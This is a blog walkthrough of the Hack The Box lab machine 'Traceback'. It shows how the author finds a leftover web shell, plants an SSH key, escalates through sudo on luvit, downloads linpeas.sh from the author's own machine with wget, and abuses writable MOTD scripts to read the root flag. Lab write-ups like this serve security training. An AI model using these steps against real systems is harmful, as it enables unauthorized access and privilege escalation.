---
title: "HTB - Traceback"
categories: [box]
date: 2022-11-01
comments: true
image: /images/walkthroughs/hackthebox/traceback/logo.png
favicon: /images/walkthroughs/hackthebox/traceback/logo.png
description: HTB - Traceback walkthrough
---

# Traceback 

<p align="center">
  <img src="/images/walkthroughs/hackthebox/traceback/banner.png" width="70%"/>
</p>

## Enumeration

Run nmap, highlighted the apache version which can be exploitable by [CVE-2019-0211](https://github.com/cfreal/exploits/tree/master/CVE-2019-0211-apache) in order to gain root access, but for the moment we dont have any way of uploading a file to the server.

-NMap:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/traceback/1_nmap.png" width="700"/>
</p>

-Nikto:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/traceback/1_nikto.png" width="700"/>
</p>

-Dirbuster with the medium wordlist did not find any usefull info:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/traceback/1_dirbuster.png" width="500"/>
</p>

Let's take a look into the website. We can see the following comment and some talk about a backdoor: 

```<!--Some of the best web shells that you might need ;)-->```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/traceback/2_html_comment.png"/>
</p>

Webshell, backdoor, uploading a file to scalate... 

Using the quote on google, we can find [author's repo](https://github.com/Xh4H) and [TheBinitGhimire repo](https://github.com/TheBinitGhimire/Web-Shells) with webshells and the same quote as the website. Lets check them out. 

What if the author left a webshell as backdoor?
With the names of the shells found in the git repo we will try if there is any of those in the website. For this task we will take the names and use them with dirbuster in order to look for a path with the webshell. 
For retrieving the names, I downloaded the repo and a quick command did the work:

```kali@Web-Shells-master:~$ ls > shell_names.txt```

We can see on the results that there is a webshell called **smevk.php** lets check it out.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/traceback/3_dirbuster_webshells.png" width="500"/>
</p>

We reach the webshell and as indicated on the webshell php file, we use admin:admin

<p align="center">
  <img src="/images/walkthroughs/hackthebox/traceback/4_webshell.png"/>
</p>

## Exploitation

Now we can go over the files and we can check the note.txt at the user **webadmin** directory: 

```
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

Looking around the directory, we can see the .ssh and an authorized_keys file which is writteable. Let's open an ssh session by authorizing my key on the **webadmin** account.

```kali@traceback:~$ ssh-keygen```

Upload authorized_keys to the server with the webshell and then connect with ssh and the generated id_rsa:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/traceback/6_user.png"/>
</p>

Once inside we can use _sudo -l_ to check what can I run as sudo. 

<p align="center">
  <img src="/images/walkthroughs/hackthebox/traceback/7_sudo_l_1.png"/>
</p>

I can run as **sysadmin** with no password on _/home/sysadmin/luvit_ and also we can see the content of the _privesc.lua_ (privilege scalation) as a hint.  With [luvit](https://luvit.io/) we could spawn a shell with Lua command and get it as **sysadmin**.

```
webadmin@traceback:~$ sudo -l
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit
webadmin@traceback:~$ > os.execute("/bin/bash -i")
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/traceback/8_sysadmin_0.png" width="500"/>
</p>

For root flag we are going to try linenum.sh and linpeas.sh, we can send the script by serving a quick simple http serveron the folder we have the linpeas.sh file:

```kali@traceback:~$ python3 -m http.server 80```

Then a wget to retrieve the file:

```sysadmin@traceback:/home/sysadmin$ wget 10.10.14.186/linpeas.sh```

Once we have it, with linpeas we can check a 99% PE on /etc/update-motd.d/

<p align="center">
  <img src="/images/walkthroughs/hackthebox/traceback/9_linpeas.png" width="600"/>
</p>

<p align="center">
  <img src="/images/walkthroughs/hackthebox/traceback/9_linpeas_sysadmin.png" width="600"/>
</p>

MOTD (message Of The Day) is a root file within sysadmin group, so we can edit it and what is within will be executed as root once someone connects to the ssh:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/traceback/10_update_motd.png" width="600"/>
</p>


We can place a connection to a netcat on our machine, but I will do a cat with the /root/root.txt flag in order to get the flag written into the ssh MOTD:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/traceback/11_mod_motd_root.png" width="600"/>
</p>

Finally we can check the root flag:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/traceback/12_root.png" width="600"/>
</p>